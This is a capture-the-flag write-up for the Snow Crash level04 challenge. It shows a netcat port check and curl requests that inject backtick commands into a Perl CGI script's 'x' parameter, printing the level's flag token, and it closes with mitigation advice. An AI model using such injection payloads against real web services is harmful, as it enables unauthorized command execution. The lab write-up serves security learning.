# Level04 - Snow Crash Exploit

## Description

While exploring the `level04` directory, I found a file called `level04.pl`. Executing it produced the following output:

```
Content-type: text/html
```

Upon inspecting the script, I noticed a comment referencing `localhost:4747`, suggesting that a service is running on this port.

## Reconnaissance

To check if anything was listening on port 4747, I used a verbose netcat scan:

```bash
nc -zv localhost 4747
```

The output confirmed a service was running:

```
Connection to localhost 4747 port [tcp/*] succeeded!
```

## Vulnerability Analysis

Reviewing the script, I saw that it expects a value passed in the `x` parameter, which is then processed by the `x()` function. The script uses backticks to evaluate and print the argument, making it vulnerable to command injection.

## Exploitation Steps

1. **Test Command Execution:**

   Passing a command substitution in the `x` parameter using `curl`:

   ```bash
   curl localhost:4747/?x="\`/usr/bin/whoami\`"
   ```

   Output:

   ```
   flag04
   ```

2. **Get the Flag:**

   Execute the `getflag` binary via command injection:

   ```bash
   curl localhost:4747/?x="\`/bin/getflag\`"
   ```

   Output:

   ```
   Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
   ```

## Mitigation

To prevent this vulnerability, user input should never be evaluated or executed directly. Always sanitize and validate input, and avoid using backticks or `eval` with user-supplied data.

## Flag